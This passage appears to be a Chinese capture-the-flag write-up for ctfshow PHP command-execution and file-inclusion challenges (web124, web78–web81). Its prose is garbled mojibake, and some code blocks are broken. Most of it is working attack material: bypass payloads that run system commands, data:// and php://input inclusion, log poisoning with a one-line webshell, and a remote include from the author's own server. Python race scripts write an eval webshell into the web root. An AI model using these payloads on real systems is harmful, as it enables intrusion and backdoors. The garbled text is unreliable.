</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜æŠŠPWDå’Œ#ä¹Ÿbanæ‰äº†</p>
<p>å¯ä»¥è€ƒè™‘ç”¨$?æ¥ä»£æ›¿${#1}</p>
<p>$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payload:</p>
<pre tabindex="0"><code>&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? 
</code></pre><blockquote>
<p>&lt;AæŒ‡ä»¤ä¸çŸ¥é“æ˜¯å•¥ï¼ŒåŸ‹ä¸ªå‘</p></blockquote>
<h4 id="web124">web124<a hidden class="anchor" aria-hidden="true" href="#web124">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: æ”¶é›†è‡ªç½‘ç»œ
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-06 14:04:45
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="c1">//ä¾‹å­ c=20-1
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="c1"></span>    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;å¤ªé•¿äº†ä¸ä¼šç®—&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="c1">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="c1"></span>    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;abs&#39;</span><span class="p">,</span> <span class="s1">&#39;acos&#39;</span><span class="p">,</span> <span class="s1">&#39;acosh&#39;</span><span class="p">,</span> <span class="s1">&#39;asin&#39;</span><span class="p">,</span> <span class="s1">&#39;asinh&#39;</span><span class="p">,</span> <span class="s1">&#39;atan2&#39;</span><span class="p">,</span> <span class="s1">&#39;atan&#39;</span><span class="p">,</span> <span class="s1">&#39;atanh&#39;</span><span class="p">,</span> <span class="s1">&#39;base_convert&#39;</span><span class="p">,</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span> <span class="s1">&#39;ceil&#39;</span><span class="p">,</span> <span class="s1">&#39;cos&#39;</span><span class="p">,</span> <span class="s1">&#39;cosh&#39;</span><span class="p">,</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> <span class="s1">&#39;decoct&#39;</span><span class="p">,</span> <span class="s1">&#39;deg2rad&#39;</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span> <span class="s1">&#39;expm1&#39;</span><span class="p">,</span> <span class="s1">&#39;floor&#39;</span><span class="p">,</span> <span class="s1">&#39;fmod&#39;</span><span class="p">,</span> <span class="s1">&#39;getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> <span class="s1">&#39;hypot&#39;</span><span class="p">,</span> <span class="s1">&#39;is_finite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_infinite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_nan&#39;</span><span class="p">,</span> <span class="s1">&#39;lcg_value&#39;</span><span class="p">,</span> <span class="s1">&#39;log10&#39;</span><span class="p">,</span> <span class="s1">&#39;log1p&#39;</span><span class="p">,</span> <span class="s1">&#39;log&#39;</span><span class="p">,</span> <span class="s1">&#39;max&#39;</span><span class="p">,</span> <span class="s1">&#39;min&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_rand&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_srand&#39;</span><span class="p">,</span> <span class="s1">&#39;octdec&#39;</span><span class="p">,</span> <span class="s1">&#39;pi&#39;</span><span class="p">,</span> <span class="s1">&#39;pow&#39;</span><span class="p">,</span> <span class="s1">&#39;rad2deg&#39;</span><span class="p">,</span> <span class="s1">&#39;rand&#39;</span><span class="p">,</span> <span class="s1">&#39;round&#39;</span><span class="p">,</span> <span class="s1">&#39;sin&#39;</span><span class="p">,</span> <span class="s1">&#39;sinh&#39;</span><span class="p">,</span> <span class="s1">&#39;sqrt&#39;</span><span class="p">,</span> <span class="s1">&#39;srand&#39;</span><span class="p">,</span> <span class="s1">&#39;tan&#39;</span><span class="p">,</span> <span class="s1">&#39;tanh&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nx">preg_match_all</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="c1">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è®¾ç½®äº†ç™½åå•å’Œé»‘åå•ï¼Œç™½åå•æ˜¯æ•°å­¦å‡½æ•°ï¼Œé»‘åå•åˆ™æ˜¯ä¸€äº›ç¬¦å·ï¼Œè€Œä¸”æœ‰é•¿åº¦é™åˆ¶</p>
<p>è¿™é¢˜çš„æ€è·¯å…¶å®å°±æ˜¯è¦è€ƒè™‘ç”¨æ•°å­—é€šè¿‡æ•°å­¦è¿ç®—å‡½æ•°çš„è½¬æ¢æ¥æ„é€ å‡ºæˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„å­—ç¬¦</p>
<p>å°±æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å…ˆå°†éœ€è¦çš„å­—ç¬¦è½¬æ¢æˆ16è¿›åˆ¶åå†è½¬æ¢æˆ10è¿›åˆ¶ï¼Œå†æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™é€šè¿‡æ•°å­¦å‡½æ•°è½¬æ¢å›å»</p>
<p><a href="https://www.cnblogs.com/FallenStar/articles/17064728.html">CTFshow-WEBå…¥é—¨-å‘½ä»¤æ‰§è¡Œweb124 - Hacker&amp;Cat - åšå®¢å›­</a></p>
<pre tabindex="0"><code>ç›®æ ‡ä»£ç ï¼š$_GET[&#39;abs&#39;]($_GET[&#39;acos&#39;])
</code></pre><pre tabindex="0"><code>dechex()ï¼Œ10è¿›åˆ¶è½¬16è¿›åˆ¶

base_convert(å€¼,åŸè¿›åˆ¶,ç›®æ ‡è¿›åˆ¶)ï¼Œä»»æ„è¿›åˆ¶è½¬æ¢

hex2binï¼Œ16è¿›åˆ¶è½¬å­—ç¬¦ä¸²
</code></pre><p>è§£é¢˜ï¼š</p>
<p>base_convert(26941962055,10,34) ä¸º hex2bin</p>
<p>base_convert(26941962055,10,34)(dechex(1598506324)) ä¸º _GET</p>
<p>æ„é€ payload</p>
<pre tabindex="0"><code>c=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})&amp;abs=system&amp;asin=ls
</code></pre><hr>
<h3 id="æ–‡ä»¶åŒ…å«"><strong>æ–‡ä»¶åŒ…å«</strong><a hidden class="anchor" aria-hidden="true" href="#æ–‡ä»¶åŒ…å«">#</a></h3>
<blockquote>
<p>ä»¥PHPä¸ºä¾‹,å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§include(),require(),include_once(),require_once()</p></blockquote>
<h4 id="web78">Web78<a hidden class="anchor" aria-hidden="true" href="#web78">#</a></h4>
<p>phpä¼ªåè®®</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 10:52:43
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 10:54:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<blockquote>
<p>?file=data://text/plain,<?php system("cat flag.php")?></p></blockquote>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°flag</p>
<p><img alt="image-20241121192438056" loading="lazy" src="./assets/image-20241121192438056.png"></p>
<h4 id="web79">web79<a hidden class="anchor" aria-hidden="true" href="#web79">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:10:14
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 11:12:38
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜ç›¸å¯¹äºä¸Šä¸€é¢˜ä¼šå°†fileä¸­çš„phpæ›¿æ¢ä¸º???</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡base64è¿›è¡Œç»•è¿‡</p>
<pre tabindex="0"><code>?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
</code></pre><p>or</p>
<pre tabindex="0"><code>?file=data://text/plain,&lt;?=system(&#39;tac flag*&#39;);?&gt; 

?file=data://text/plain,&lt;?Php echo `tac f*`;?&gt;
</code></pre><p>or</p>
<p>è¿œç¨‹åŠ è½½</p>
<blockquote>
<p>åŠ è½½robots.txtï¼Œå‘ç°å¯ä»¥å›æ˜¾</p>
<p>åœ¨è‡ªå·±vpsä¸Šåˆ›å»º1.txtï¼Œå†…å®¹å¦‚ä¸‹ <code>&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></p>
<p>èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼ŒåŠ è½½ <code>url/?file=http://x.x.x.x:7001/1.txt</code></p></blockquote>
<p>or</p>
<p>inputåè®® å¤§å°å†™ç»•è¿‡</p>
<p>payload:</p>
<pre tabindex="0"><code>POST /?file=Php://input HTTP/1.1

&lt;?Php system(&#34;cat flag.php&#34;);?&gt;
</code></pre><h4 id="web80">web80<a hidden class="anchor" aria-hidden="true" href="#web80">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">Accept-Encoding: gzip, deflate
</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">DNT: 1
</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="err">Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="err">Connection: close
</span></span></span></code></pre></div><p>å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p><img alt="image-20241121201547420" loading="lazy" src="./assets/image-20241121201547420.png"></p>
<p>è¿webshellå·¥å…·æˆ–è€…ç›´æ¥getä¼ å‚</p>
<pre tabindex="0"><code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();

?file=/var/log/nginx/access.log&amp;2=system(&#39;tac /var/www/html/fl0g.php&#39;);phpinfo();
</code></pre><p>Or</p>
<p>inputåè®® å¤§å°å†™ç»•è¿‡</p>
<p>payload:</p>
<pre tabindex="0"><code>POST /?file=Php://input HTTP/1.1

&lt;?Php system(&#34;cat flag.php&#34;);?&gt;
</code></pre><p><img alt="image-20241121202826975" loading="lazy" src="./assets/image-20241121202826975.png"></p>
<h4 id="web81">web81<a hidden class="anchor" aria-hidden="true" href="#web81">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="cp">?&gt;</span><span class="err">&#39;);?&gt;&#34;
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err">    data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: code}
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="err">    cookies = {&#39;PHPSESSID&#39;: PHPSESSID}
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="err">    files = {&#39;file&#39;: (&#39;xxx.txt&#39;, BytesIO(b&#39;x&#39; * 10240))}
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="err">    while True:
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="err">        post(URL, data, cookies=cookies, files=files)
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="err">def read():
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="err">    params = {&#39;file&#39;: f&#39;/tmp/sess_{PHPSESSID}&#39;}
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="err">    while True:
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="err">        get(URL, params)
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="err">        url = urljoin(URL, &#39;shell.php&#39;)
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="err">        code = get(url).status_code.real
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err">        print(f&#39;{url} {code}&#39;)
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err">        if code == 200:
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="err">            exit()
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="err">if __name__ == &#39;__main__&#39;:
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="err">    Thread(target=write, daemon=True).start()
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="err">    read()
</span></span></span></code></pre></div><p>poc2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">import</span> <span class="nx">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">import</span> <span class="nx">io</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">import</span> <span class="nx">threading</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nx">url</span><span class="o">=</span><span class="s1">&#39;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">sessionid</span><span class="o">=</span><span class="s1">&#39;ctfshow&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nx">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="s2">&#34;1&#34;</span><span class="o">:</span><span class="s2">&#34;file_put_contents(&#39;/var/www/html/jiuzhen.php&#39;,&#39;&lt;?php eval(</span><span class="si">$_POST[3]</span><span class="s2">);?&gt;&#39;);&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1">#è¿™ä¸ªæ˜¯è®¿é—®/tmp/sess_ctfshowæ—¶ï¼Œpostä¼ é€’çš„å†…å®¹ï¼Œæ˜¯åœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚è¿™æ ·ä¸€æ—¦è®¿é—®æˆåŠŸï¼Œå°±å¯ä»¥èšå‰‘è¿æ¥äº†ã€‚
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1"></span><span class="nx">def</span> <span class="nx">write</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span><span class="c1">#/tmp/sess_ctfshowä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span>	<span class="nx">fileBytes</span> <span class="o">=</span> <span class="nx">io</span><span class="o">.</span><span class="nx">BytesIO</span><span class="p">(</span><span class="nx">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">	<span class="k">while</span> <span class="k">True</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">		<span class="nx">response</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">			<span class="nx">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">			<span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="o">:</span><span class="s1">&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="p">},</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">			<span class="nx">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">			<span class="s1">&#39;PHPSESSID&#39;</span><span class="o">:</span><span class="nx">sessionid</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="p">},</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">			<span class="nx">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">			<span class="s1">&#39;file&#39;</span><span class="o">:</span><span class="p">(</span><span class="s1">&#39;ctfshow.jpg&#39;</span><span class="p">,</span><span class="nx">fileBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">			<span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
